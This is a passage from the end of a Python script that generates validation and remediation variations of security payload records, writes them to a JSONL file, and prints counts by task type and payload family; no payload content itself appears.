                records.append(rec)

        for v in range(max(3, args.variations // 2)):
            rec = generate_validation_variation(payload, v)
            if rec:
                records.append(rec)

        for v in range(max(3, args.variations // 2)):
            rec = generate_remediation_variation(payload, v)
            if rec:
                records.append(rec)

    print("[4/4] Writing output...")
    with open(output_path, "w", encoding="utf-8") as f:
        for record in records:
            f.write(json.dumps(record, ensure_ascii=False) + "\n")

    task_counts = {}
    for r in records:
        task = r["metadata"]["task"]
        task_counts[task] = task_counts.get(task, 0) + 1

    family_counts = {}
    for r in records:
        families = r["metadata"].get("argus_payload_families", [])
        for fam in families:
            family_counts[fam] = family_counts.get(fam, 0) + 1

    print(f"\n[done] Wrote {len(records)} records to {output_path}")
    print(f"\nTask type distribution:")
    for task, count in sorted(task_counts.items()):
        print(f"  {task}: {count}")
    print(f"\nPayload family coverage: {len(family_counts)} families")
    print(f"Min examples per family: {min(family_counts.values()) if family_counts else 0}")
    print(f"Max examples per family: {max(family_counts.values()) if family_counts else 0}")
    print(f"\nTotal: {len(records)} examples")


if __name__ == "__main__":
    main()